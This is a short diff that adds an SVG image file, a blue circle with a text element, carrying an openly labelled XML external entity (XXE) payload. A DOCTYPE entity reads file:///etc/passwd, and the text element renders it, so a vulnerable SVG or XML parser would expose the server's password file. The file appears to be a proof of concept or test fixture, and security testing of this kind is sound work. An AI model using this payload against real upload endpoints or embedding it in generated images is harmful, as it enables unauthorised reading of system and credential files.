@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="200" height="200">
+  <!-- Visual element -->
+  <circle cx="100" cy="100" r="50" fill="blue" />
+  <!-- XXE payload -->
+  <text x="10" y="180" font-size="16" fill="black">
+    &xxe;
+  </text>
+</svg>
